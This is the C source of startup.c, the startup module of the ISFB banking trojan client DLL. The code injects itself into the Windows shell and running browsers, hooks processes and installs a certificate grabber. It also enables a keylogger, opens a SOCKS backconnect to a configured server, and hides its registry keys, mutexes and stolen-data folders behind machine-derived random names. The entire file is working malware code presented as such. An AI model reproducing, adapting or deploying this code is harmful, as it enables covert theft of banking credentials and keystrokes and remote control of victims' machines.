//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: startup.c
// $Revision: 458 $
// $Date: 2015-01-26 18:41:16 +0300 (Пн, 26 янв 2015) $
// description:
//	ISFB client DLL. Process startup and initialization code.
//	This module contains main startup\cleanup routines and functions used to inject the DLL into the system shell process 
//	 and into all browsers currently running.


#include "..\common\common.h"
#include "..\crypto\crypto.h"
#include "..\acdll\activdll.h"
#include "..\crm.h"
#include "parser.h"
#include "conf.h"
#include "command.h"
#include <Tlhelp32.h>
#include "pipes.h"
#include "files.h"
#include "..\common\joiner.h"
#ifdef _ENABLE_SOCKS
 #include "..\bcclient\bcclient.h"
 #include "..\sockslib\socks.h"
#endif
#ifdef _ENABLE_KEYLOG
 #include "..\keylog\keylog.h"
#endif

// ---- Variables -----------------------------------------------------------------------------------------------------------
ULONG			g_MachineRandSeed = 0;
static PVOID	g_PrevUnhandledExceptionFilter = (PVOID)-1;
static ULONG	g_LastDeviceState = 0;


// Machine level random names
LPTSTR			g_MainRegistryKey	= NULL;		// application registry key
LPTSTR			g_VarsRegistryKey	= NULL;		// vars registry subkey
LPTSTR			g_FilesRegistryKey	= NULL;
LPTSTR			g_RunRegistryKey	= NULL;		// run registry subkey
LPTSTR			g_UpdateEventName	= NULL;		// 
LPTSTR			g_DllMutexName		= NULL;
HANDLE			g_DllMutex			= 0;

#define MAX_WORKERS_COUNT	4

// ---- Function predifinitions -----------------------------------------------------------------------------------------------

// from certs.c
extern	WINERROR CertSetHooks(VOID);

// from client.c
extern	WINERROR ClientCleanup(VOID);

// from wnd.c
extern	WINERROR WndStartup(VOID);
extern	VOID WndCleanup(VOID);

// from vfs.c
WINERROR VfsSaveFile(LPTSTR	FileName, PCHAR	Buffer, ULONG Size, ULONG Flags);


PVOID	g_hExceptionHandler = NULL;

//
//	This function allows to handle exceptions within our DLL module using normal __try/__except logic even when the DLL
//		was injected as image (without a file) on x64 machine.
//
LONG CALLBACK CrmVectoredExceptionHandler(
	PEXCEPTION_POINTERS ExceptionInfo
	)
{
	LONG Status = EXCEPTION_CONTINUE_SEARCH;	

	// Check if this is not a debug exception
	if (NT_ERROR(ExceptionInfo->ExceptionRecord->ExceptionCode))
	{
		PIMAGE_NT_HEADERS Pe = IMAGE_PE_HEADER(g_CurrentModule);

#ifdef _WIN64
		PIMAGE_DATA_DIRECTORY	ExDir;
		PRUNTIME_FUNCTION	pRuntime;
		PUNWIND_INFO		pUnwind;
		PEXCEPTION_DATA		pExceptionData;
		PSCOPE_RECORD		pScopeRecord;
		ULONG i;

		// Check if the exception happend within our module
		if ((ULONG_PTR)ExceptionInfo->ExceptionRecord->ExceptionAddress > (ULONG_PTR)g_CurrentModule &&
			(ULONG_PTR)ExceptionInfo->ExceptionRecord->ExceptionAddress < ((ULONG_PTR)g_CurrentModule + Pe->OptionalHeader.SizeOfImage))
		{
			ExDir = &Pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

			if (ExDir->VirtualAddress)
			{
				ULONG ExceptionOffset = (ULONG)((ULONG_PTR)ExceptionInfo->ExceptionRecord->ExceptionAddress - (ULONG_PTR)g_CurrentModule);

				pRuntime = (PRUNTIME_FUNCTION)((PCHAR)g_CurrentModule + ExDir->VirtualAddress);

				while(pRuntime->BeginAddress)
				{
					// Looking for the exception function
					if (pRuntime->BeginAddress < ExceptionOffset && pRuntime->EndAddress > ExceptionOffset)
					{
						pUnwind = (PUNWIND_INFO)((PCHAR)g_CurrentModule + pRuntime->UnwindData);

						// Checking if there's an exception handler set 
						if (pUnwind->Flags & UNW_FLAG_EHANDLER)
						{
							// This exception can be handled
							pExceptionData = (PEXCEPTION_DATA)_ALIGN((ULONG_PTR)pUnwind + sizeof(UNWIND_INFO) + (sizeof(UNWIND_CODE) * pUnwind->CountOfCodes) - sizeof(UNWIND_CODE), sizeof(ULONG));
							pScopeRecord = (PSCOPE_RECORD)&pExceptionData->ScopeTable.ScopeRecord[0];

							// Analyzing the scope table
							for (i=0; i<pExceptionData->ScopeTable.Count; i++)
							{
								// Check if the exception occured within a __try() block
								if (ExceptionOffset >= pScopeRecord->BeginAddress && ExceptionOffset < pScopeRecord->EndAddress)
								{
									// Saving our exception code to RAX
									ExceptionInfo->ContextRecord->Rax = ExceptionInfo->ExceptionRecord->ExceptionCode;
									// Adjusting RIP to an exception handler address
									ExceptionInfo->ContextRecord->Rip = (ULONG_PTR)g_CurrentModule + pScopeRecord->JumpTarget;

									Status = EXCEPTION_CONTINUE_EXECUTION;
									break;
								}	// if (ExceptionOffset >= pScopeRecord->BeginAddress && ExceptionOffset < pScopeRecord->EndAddress)
								pScopeRecord += 1;
							}	// for (i=0; i<pExceptionData->ScopeTable.Count; i++)
						}	// if (pUnwind->Flags & UNW_FLAG_EHANDLER)
						break;
					}	// if (pRuntime->BeginAddress < ExceptionOffset && pRuntime->EndAddress > ExceptionOffset)
					pRuntime += 1;
				}	// while(pRuntime->BeginAddress)
			}	// if (ExDir->VirtualAddress)
		}	// if ((ULONG_PTR)ExceptionInfo->ExceptionRecord->ExceptionAddress > (ULONG_PTR)g_CurrentModule &&

#else	// WIN64
		// Getting SEH frame for the current thread
		PTEB	pTeb = NtCurrentTeb();
		PEXCEPTION_REGISTRATION_RECORD	ExceptionList = pTeb->Tib.ExceptionList;

		Status = ExceptionContinueSearch;

		// Walking through the SEH frame and executing each handler manually
		while(ExceptionList && ExceptionList != INVALID_HANDLE_VALUE && Status == ExceptionContinueSearch)
		{
			if ((ULONG_PTR)ExceptionList->Handler > (ULONG_PTR)g_CurrentModule &&
				(ULONG_PTR)ExceptionList->Handler < ((ULONG_PTR)g_CurrentModule + Pe->OptionalHeader.SizeOfImage))
				Status = ExceptionList->Handler(ExceptionInfo->ExceptionRecord, ExceptionList, ExceptionInfo->ContextRecord, NULL);

			ExceptionList = ExceptionList->Next;
		}

		// Converting SEH return value into VEH return value
		if (Status == ExceptionContinueSearch)
			Status = EXCEPTION_CONTINUE_SEARCH;
		else
			Status = EXCEPTION_CONTINUE_EXECUTION;
#endif	// !WIN64
	}	// if (NT_ERROR(ExceptionInfo->ExceptionRecord->ExceptionCode))

	return(Status);
}


// ----- Thread functions -----------------------------------------------------------------------------------------------------

//
//	Dll-unload thread routine. This thread waits until one of two events occured, either g_AppShutdownEvent or 
//   dll update event named g_UpdateEventName. When dll update event signaled, this routine calls FreeLibrary with 
//   the current dll handle and modifies a return address so, that after FreeLibrary the ExitThread function called.
//	
static WINERROR WINAPI DllUnloadThread(PVOID Param)
{
	WINERROR Status = NO_ERROR;
	HANDLE Events[2] = { g_AppShutdownEvent, 0 };

	ENTER_WORKER();
	
	DbgPrint("ISFB_%04x: DLL unload thread started with ID 0x%x.\n", g_CurrentProcessId, GetCurrentThreadId());

	ASSERT(g_UpdateEventName);
	ASSERT(g_AppShutdownEvent);

	if (Events[1] = CreateEvent(&g_DefaultSA, TRUE, FALSE, g_UpdateEventName))
	{
		Status = WaitForMultipleObjects(2, Events, FALSE, INFINITE);
		CloseHandle(Events[1]);

		if (Status == (WAIT_OBJECT_0 + 1))
		{
			HKEY	hKey;

			// Here we have Update Event fired
			DbgPrint("ISFB_%04x: Update event fired, unloading the DLL.\n", g_CurrentProcessId);

			// Try to remove previously saved group ID
			if (RegOpenKey(HKEY_CURRENT_USER, g_MainRegistryKey, &hKey) == NO_ERROR)
			{
				g_ClientId.GroupId = 0;
				RegSetValueEx(hKey, szDataRegClientId, 0, REG_BINARY, (PCHAR)&g_ClientId, sizeof(CRM_CLIENT_ID));
				RegCloseKey(hKey);
			}

			if (_INJECT_AS_IMAGE || g_IsAppCertDll)
			{
				// The DLL was loaded as AppCertDll. We cannot just free it because of the bug within kernel32.dll:
				//	it preserves the address of CreateProcessNotify() function and doesn't track if the DLL was unloaded.
				// So we just perform a cleanup, but the DLL stays loaded.

				if (InterlockedDecrement(&g_AttachCount) == 0)
				{
					if (!(_INJECT_AS_IMAGE))
						DisableThreadLibraryCalls(g_CurrentModule);
					ClientCleanup();
				}
			}
			else
			{
				// Freeing current DLL and exiting the thread
				LEAVE_WORKER();
				FreeLibraryAndExitThread(g_CurrentModule, 0);

				ASSERT(FALSE);	// should never get here
			}
		}	// if (Status == (WAIT_OBJECT_0 + 1))
		else
		{
			ASSERT(Status == WAIT_OBJECT_0);
		}
	}	// if (Events[1] =
	else
		Status = GetLastError();

	LEAVE_WORKER();
	return(Status);
}


static BOOL CrmGenerateNames(VOID)
{
	BOOL	Ret = FALSE;
	ULONG	GuidSeed = g_MachineRandSeed;

	DbgPrint("ISFB_%04x: Generating machine-level names from seed 0x%08x\n", g_CurrentProcessId, GuidSeed);

	do 
	{	// Not a loop.

		if (!(g_MainRegistryKey = GenGuidName(&GuidSeed, szDataRegSubkey, NULL, FALSE)))
			break;

		// Vars registry subkey
		if (!(g_VarsRegistryKey = StrCatAlloc(g_MainRegistryKey, szVars)))
			break;

		// Files registry subkey
		if (!(g_FilesRegistryKey = StrCatAlloc(g_MainRegistryKey, szFiles)))
			break;

		// Run registry subkey
		if (!(g_RunRegistryKey = StrCatAlloc(g_MainRegistryKey, szRun)))
			break;

		// Randomizing DLL-only values
		GuidSeed ^= uDllSeed;

		// Update event name
		if (!(g_UpdateEventName = GenGuidName(&GuidSeed, szLocal, NULL, TRUE)))
			break;

		// Config update mutex name
		if (!(g_ConfigUpdateMutexName = GenGuidName(&GuidSeed, szLocal, NULL, TRUE)))
			break;

		// Config update timer name
		if (!(g_ConfigUpdateTimerName = GenGuidName(&GuidSeed, szLocal, NULL, TRUE)))
			break;

		// Command request mutex name
		if (!(g_CommandMutexName = GenGuidName(&GuidSeed, szLocal, NULL, TRUE)))
			break;

		// Command request timer name
		if (!(g_CommandTimerName = GenGuidName(&GuidSeed, szLocal, NULL, TRUE)))
			break;

		// BC request mutex name
		if (!(g_BcMutexName = GenGuidName(&GuidSeed, szLocal, NULL, TRUE)))
			break;

		// BC request timer name
		if (!(g_BcTimerName = GenGuidName(&GuidSeed, szLocal, NULL, TRUE)))
			break;

		// Server pipe name
		if (!(g_ServerPipeName = GenGuidName(&GuidSeed, szPipe, NULL, TRUE)))
			break;

		// Name of the folder for storing SOLs
		if (!(g_SolStorageName = GenGuidName(&GuidSeed, szAppDataMicrosoft, NULL, TRUE)))
			break;

		// Name of the folder to store grabbed and unsent data
		if (!(g_GrabStorageName = GenGuidName(&GuidSeed, szAppDataMicrosoft, NULL, TRUE)))
			break;
		
		// Name of the file for command log
		if (!(g_CommandLogName = GenGuidName(&GuidSeed, szAppDataMicrosoft, NULL, TRUE)))
			break;
		
		// Send data mutex name
		if (!(g_SendMutexName = GenGuidName(&GuidSeed, szLocal, NULL, TRUE)))
			break;

		// Send data timer name
		if (!(g_SendTimerName = GenGuidName(&GuidSeed, szLocal, NULL, TRUE)))
			break;

		// Dll mutex name
		GuidSeed = g_MachineRandSeed + g_CurrentProcessId;
		if (!(g_DllMutexName = GenGuidName(&GuidSeed, NULL, NULL, TRUE)))
			break;

#if _DISPLAY_NAMES	
		DbgPrint("ISFB_%04x: Program main registry key is %s.\n", g_CurrentProcessId, g_MainRegistryKey);
		DbgPrint("ISFB_%04x: Config update mutex name is %s.\n", g_CurrentProcessId, g_ConfigUpdateMutexName);
		DbgPrint("ISFB_%04x: Config update timer name is %s.\n", g_CurrentProcessId, g_ConfigUpdateTimerName);
		DbgPrint("ISFB_%04x: Version update mutex name is %s.\n", g_CurrentProcessId, g_ConfigUpdateMutexName);
		DbgPrint("ISFB_%04x: Update event name is %s.\n", g_CurrentProcessId, g_UpdateEventName);
#endif
		DbgPrint("ISFB_%04x: Dll mutex name is %s.\n", g_CurrentProcessId, g_DllMutexName);


		Ret = TRUE;

	} while (FALSE);

	return(Ret);
}


//
//	Loading and parsing INI-files attached to the current module.
//
static VOID CrmLoadIni(VOID)
{
	PCHAR	pValue;
	ULONG	iValue, ClientIniSize;
	PINI_PARAMETERS	pIniParams = NULL;

#ifdef _CHECK_DIGITAL_SIGNATURE
	PCHAR	pPublicKey;
	ULONG	PublicKeySize;

	// Loading attached RSA public key first
	if (GetJoinedData((PIMAGE_DOS_HEADER)g_CurrentModule, &pPublicKey, &PublicKeySize, FALSE, g_CsCookie ^ CRC_PUBLIC_KEY, TARGET_FLAG_BINARY))
		g_pPublicKey = pPublicKey;
#endif

#ifdef _LOAD_INI
	// Checking for an INI-file stored within the registry
	if (RegReadValue(szDataRegIniValue, (PCHAR*)&pIniParams, &ClientIniSize) == NO_ERROR)
	{
 #ifdef _CHECK_DIGITAL_SIGNATURE
		if (!(ClientIniSize = VerifyDataSignature((PCHAR)pIniParams, ClientIniSize, TRUE)))
		{
			hFree(pIniParams);
			pIniParams = NULL;
		}
		else
 #endif
		{
			DbgPrint("ISFB_%04x: INI-file loaded from the registry.\n", g_CurrentProcessId);
		}
	}	// if (RegReadValue(szDataRegIniValue...
#endif

	// Loading attached INI-file
	if (pIniParams ||
		GetJoinedData((PIMAGE_DOS_HEADER)g_CurrentModule, (PCHAR*)&pIniParams, &ClientIniSize, FALSE, g_CsCookie ^ CRC_CLIENT_INI, TARGET_FLAG_INI))
	{
		if ((pValue = IniGetParamValueWithCookie(CRC_CONFIGTIMEOUT, pIniParams)) && StrToIntEx(pValue, 0, &iValue))
			g_ConfigTimeout = iValue;

		if ((pValue = IniGetParamValueWithCookie(CRC_CONFIGFAILTIMEOUT, pIniParams)) && StrToIntEx(pValue, 0, &iValue))
			g_ConfigFailTimeout = iValue;

		if ((pValue = IniGetParamValueWithCookie(CRC_TASKTIMEOUT, pIniParams)) && StrToIntEx(pValue, 0, &iValue))
			g_TaskTimeout = iValue;

		if ((pValue = IniGetParamValueWithCookie(CRC_SENDTIMEOUT, pIniParams)) && StrToIntEx(pValue, 0, &iValue))
			g_SendTimeout = iValue;

		if ((pValue = IniGetParamValueWithCookie(CRC_BCTIMEOUT, pIniParams)) && StrToIntEx(pValue, 0, &iValue))
			g_BcTimeout = iValue;

		if ((pValue = IniGetParamValueWithCookie(CRC_GROUP, pIniParams)) && StrToIntEx(pValue, 0, &iValue))
			g_ClientId.GroupId = iValue;

		if ((pValue = IniGetParamValueWithCookie(CRC_SERVER, pIniParams)) && StrToIntEx(pValue, 0, &iValue))
			g_ServerId = iValue;

		if (g_HostProcess == HOST_EX)
		{
#ifdef _TASK_FROM_EXPLORER
			if ((pValue = IniGetParamValueWithCookie(CRC_KNOCKERTIMEOUT, pIniParams)) && StrToIntEx(pValue, 0, &iValue))
				g_KnockerTimeout = iValue;
#endif
#ifdef _ENABLE_SOCKS
			if (pValue = IniGetParamValueWithCookie(CRC_BCSERVER, pIniParams))
				IniStringToTcpAddress(pValue, &g_BcServer, TRUE);
#endif
		}	// if (g_HostProcess == HOST_EX)

#if (defined(_ENCRYPT_REQUEST_URI) || defined(_ENCRYPT_SENT_DATA))
		if ((pValue = IniGetParamValueWithCookie(CRC_SERVERKEY, pIniParams)) && (pValue = StrDupEx(pValue, sizeof(RC6_KEY))))
			g_pServerKey = pValue;
#endif

#ifndef _DYNAMIC_HOSTS
		// Creating an array of hosts from the list specified within the INI-file
		if ((pValue = IniGetParamValueWithCookie(CRC_HOSTS, pIniParams)) && (pValue = StrDupEx(pValue, 0)))
		{
			g_pHostsString = pValue;
			g_NumberHosts = (UCHAR)IniBuildArrayFromString(pValue, ' ', &g_pHosts);
			ASSERT(g_NumberHosts);
		}	// if (pValue = IniGetParamValueWithCookie(CRC_HOSTS, pIniParams))
#endif	// !_DYNAMIC_HOSTS

		hFree(pIniParams);
	}	// if (GetJoinedData((...
}


static WINERROR CrmStartDll(
	PVOID pReserved
	)
{	
	WINERROR Status = ERROR_UNSUCCESSFULL;
	ULONG	ThreadId, Length = 0;

	do	// not a loop
	{
		InitializeCriticalSection(&g_ConfigData.Lock);
		InitializeCriticalSection(&g_HostSelectLock);
		
		// Trying to create the named mutex to make sure we were not loaded into this process before
		if (!(g_DllMutex = CreateMutex(NULL, TRUE, g_DllMutexName)) || ((Status = GetLastError()) == ERROR_ALREADY_EXISTS))
		{
			ASSERT(FALSE);
			DbgPrint("ISFB_%04x: Failed to create Dll mutex: the dll seems to be already loaded.\n", g_CurrentProcessId);
			// Do not return an error here because if the DLL is being loaded by rundll32 it will display a message in this case.
			Status = NO_ERROR;
			break;
		}

		g_HostProcess = ParserGetHostProcess();

#ifdef _USE_BUILDER
		// Trying to load attached INI-file
		CrmLoadIni();
#endif

		// Initializing hooking engine
		if ((Status = InitHooks()) != NO_ERROR)
			break;

		// Allocating handle table
		Status = ParserInitHandleTable();
		if (Status != NO_ERROR)
			break;

		// Querying and saving current user name
		GetUserName(NULL, &Length);
		if (Length && (g_UserNameString = hAlloc(Length)))
			GetUserName(g_UserNameString, &Length);

		// Setting hooks
		if ((Status = ParserSetHooks()) != NO_ERROR)
		{
			DbgPrint("ISFB_%04x: Failed setting host-specific hooks.\n", g_CurrentProcessId);
			break;
		}
#if	(defined(_USER_MODE_INSTALL) && !defined(_NO_HOOKS))
		if (g_HostProcess != HOST_CR && g_HostProcess != HOST_OP && g_HostProcess != HOST_FF)
		{
			// Initializing active DLL engine
			if ((Status = AcStartup(pReserved, TRUE, NULL, &ParserModifyCmdLineW)) != NO_ERROR)
			{
				DbgPrint("ISFB_%04x: Active DLL startup failed with status %u.\n", g_CurrentProcessId, Status);
				break;
			}
		}	// if (g_HostProcess != HOST_CR && g_HostProcess != HOST_OP)
#endif

		// Load user ID from the registry or create a new one
		GetClientId();

		// Creating worker(s)
		if (!(g_Workers = (PWORKER_THREADS)hAlloc(sizeof(WORKER_THREADS) + sizeof(HANDLE)*MAX_WORKERS_COUNT)))
			break;

		g_Workers->Number = 0;
		g_Workers->ActiveCount = 0;

		if ((g_Workers->Threads[g_Workers->Number] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&DllUnloadThread, NULL, 0, &ThreadId)) == 0)
			break;
		g_Workers->Number += 1;

		if (g_HostProcess == HOST_EX)
		{
			// Shell process specific initialization
#ifdef	_ENABLE_LOGGING
			LogInit();
#endif
#ifdef	_ENABLE_KEYLOG
			// initializing KeyLog
			if ((Status = KeyLogInit()) != NO_ERROR)
				break;

			if (g_ClientId.Plugins & PG_BIT_KEYLOG)
				// Enabling the KeyLog
				KeyLogEnable(TRUE);
#else	// _ENABLE_KEYLOG
#endif	// #else	// _ENABLE_KEYLOG

			// Create global objects commonly used by browsers and the shell.
			CreateGlobalObjects();

			// Set certificates grabber hoooks
			CertSetHooks();
			
			// Start Pipes server
			if ((Status = PipeStartServer(&g_Workers->Threads[g_Workers->Number])) == NO_ERROR)
				g_Workers->Number += 1;
			else
				break;

#ifdef	_ENABLE_SOCKS
			// Starting SOCKS module
			if (g_BcServer.sin_addr.S_un.S_addr)
			{
				LPTSTR	pSocksId = NULL;

#ifndef _BC_GENERATE_ID
				if (pSocksId = hAlloc((GUID_STR_LEN + cstrlen(szSocksId) + 1) * sizeof(TCHAR)))
				{
					ULONG Length;
					Length = GuidToBuffer(&g_ClientId.UserId.Guid, pSocksId, FALSE);
					ASSERT(Length <= GUID_STR_LEN);
					lstrcpy(pSocksId + Length, szSocksId);		
#endif
					SocksStartServer(&g_SocksServer, &g_BcServer, 0, pSocksId);
#ifndef _BC_GENERATE_ID
					hFree(pSocksId);
				}
#endif
			}	// if (g_BcServer.sin_addr.S_un.S_addr)
#endif
		}	// if (g_HostProcess == HOST_EX)

		if (g_HostProcess != HOST_UNKNOWN)
		{
			if (g_HostProcess == HOST_EX)
			{
#ifdef	_TASK_FROM_EXPLORER
				ASSERT(g_UserAgentStr == NULL);
				// Creating User-agent string for the explorer, containing OS version and architecture
				if (g_UserAgentStr = hAlloc((cstrlen(szBrowserVersion) + cstrlen(szBrowserArch64) + 1) * sizeof(_TCHAR)))
 #ifdef _WIN64
					wsprintf(g_UserAgentStr, szBrowserVersion, LOBYTE(LOWORD(g_SystemVersion)), HIBYTE(LOWORD(g_SystemVersion)), szBrowserArch64);
 #else
					wsprintf(g_UserAgentStr, szBrowserVersion, LOBYTE(LOWORD(g_SystemVersion)), HIBYTE(LOWORD(g_SystemVersion)), "");
 #endif
#endif	// _TASK_FROM_EXPLORER
			}	// if (g_HostProcess == HOST_EX)

			// Starting main request thread
			if ((g_Workers->Threads[g_Workers->Number] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&MainRequestThread, NULL, 0, &ThreadId)) == 0)
				break;
			g_Workers->Number += 1;
		}	// else if (g_HostProcess != HOST_UNKNOWN)

		Status = NO_ERROR;
	} while(FALSE);

	return(Status);
}


// ---- ISFB client DLL startup and cleanup routines -----------------------------------------------------------------------

VOID CrmCleanup(VOID)
{
	ASSERT(WaitForSingleObject(g_AppShutdownEvent, 0) == WAIT_OBJECT_0);

	CleanupHooks();

#ifdef _ENABLE_KEYLOG
	if (g_HostProcess == HOST_EX)
		KeyLogCleanup();
#else	// _ENABLE_KEYLOG
#endif	// #else // _ENABLE_KEYLOG

#ifdef _ENABLE_SOCKS
	StopSocks();
#endif

	WaitForHooks();
	WaitForWorkers(1000);	// We cannot wait for a threads to stop here. Because any thread will stop until we release
							//  LdrLoaderLock, i.e. until we leave our DllMain.

#ifdef	_ENABLE_LOGGING
	if (g_HostProcess == HOST_EX)
		LogCleanup();
#endif
	ParserReleaseHandleTable();

#if _INJECT_AS_IMAGE
	if (g_hExceptionHandler)
		RemoveVectoredExceptionHandler(g_hExceptionHandler);
#endif
	if (g_DllMutex)
	{
		ReleaseMutex(g_DllMutex);
		CloseHandle(g_DllMutex);
	}
#ifdef _TRACE_CLEANUP
	DbgPrint("ISFB_%04x: Variables are freed.\n", g_CurrentProcessId);
#endif

	FreeWorkerThreads(g_Workers);
#ifdef _TRACE_CLEANUP
	DbgPrint("ISFB_%04x: Workers are stoped.\n", g_CurrentProcessId);
#endif

#ifdef	_DYNAMIC_HOSTS
	ConfReleaseHostsList();
#endif

	LsaFreeSecurityAttributes(&g_DefaultSA);
}

//
//	Crm main startup routine.
//
WINERROR CrmStartup(
	PVOID	pReserved
	)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;
	NT_SID	Sid = {0};

	// The dll can be loaded twice or more, so it's a good idea to reinitialize variables.
	g_MachineRandSeed = 0;

	// Initializing default security attributes
	if (LOBYTE(LOWORD(g_SystemVersion)) > 5)
		LsaInitializeLowSecurityAttributes(&g_DefaultSA);
	else
		LsaInitializeDefaultSecurityAttributes(&g_DefaultSA);

	do	// not a loop
	{
		// Obtaining current user SID 
		if (!(LsaGetProcessUserSID(g_CurrentProcessId, &Sid)))
		{
			DbgPrint("ISFB_%04x: Failed to resolve current user SID.\n", g_CurrentProcessId);
			Status = ERROR_ACCESS_DENIED;
			break;
		}

		// Initializing rand seed with the hash of the machine ID taken from the user SID
		if (Sid.SubcreatedityCount > 2)
		{
			LONG i;
			for (i=0; i<(Sid.SubcreatedityCount-2); i++)
			{
//				DbgPrint("ISFB_%04x: SID.SubAthority[%u] = 0x%x.\n", g_CurrentProcessId, i, Sid.Subcreatedity[i+1]);
				g_MachineRandSeed += Sid.Subcreatedity[i+1];
			}

			// Randomizing installer-specific GUID values
			g_MachineRandSeed ^= uInstallerSeed;
		}
		else
		{
			DbgPrint("ISFB_%04x: Started within system process, exiting.\n", g_CurrentProcessId);
			Status = ERROR_INVALID_FUNCTION;
			break;
		}

		// Createing active state event
		if (!(g_ActiveEvent = CreateEvent(NULL, TRUE, FALSE, NULL)))
			break;

		// Generating random object names
		if (!CrmGenerateNames())
		{
			DbgPrint("ISFB_%04x: Failed to generate random names.\n", g_CurrentProcessId);
			break;
		}

#if _INJECT_AS_IMAGE
		// Setting our VEH to handle exceptions within our DLL image
		g_hExceptionHandler = AddVectoredExceptionHandler(FALSE, &CrmVectoredExceptionHandler);
#endif
		// Statring the dll normaly
		Status = CrmStartDll(pReserved);

	} while(FALSE);
	
	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

#if _INJECT_AS_IMAGE
	if (Status != NO_ERROR && g_hExceptionHandler)
	{
		RemoveVectoredExceptionHandler(g_hExceptionHandler);
		g_hExceptionHandler = NULL;
	}
#endif
			
	return(Status);
}


WINERROR CrmStartProcess(VOID)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	LPTSTR	DllPath;

	if (DllPath = g_CurrentModulePath)
	{
		ULONG	ShellPid;
		HWND	ShellWindow = 0;

		// Inject itself into the windows shell process.
		// This may happen that shell process was not initialized yet. So, we'll wait for it.
		while(!(ShellWindow = GetShellWindow()))
			Sleep(1000);

		GetWindowThreadProcessId(ShellWindow, &ShellPid);

#ifdef _WIN64
		Status = PsSupInjectDll(ShellPid, DllPath, INJECT_MAP_PEB | INJECT_ARCH_X64);
#else
		Status = PsSupInjectDll(ShellPid, DllPath, INJECT_MAP_PEB);
#endif
	}	//	if (DllPath = g_CurrentModulePath)
	return(Status);
}


//
//	This function being called each time current user session terminates:
//		the user logs off or shuts down/reboots the OS.
//
VOID CrmNotifyEndSession(VOID)
{
	DbgPrint("ISFB_%04x: User session terminates.\n", g_CurrentProcessId);

#ifdef _ENABLE_KEYLOG
	// Saving our keylog data
	CmdGetKeylog(NULL);
#endif
#ifdef _ENABLE_SOCKS
	PlgNotify(PLG_ID_PROXY, PLG_ACTION_STOP, NO_ERROR);
#endif
}
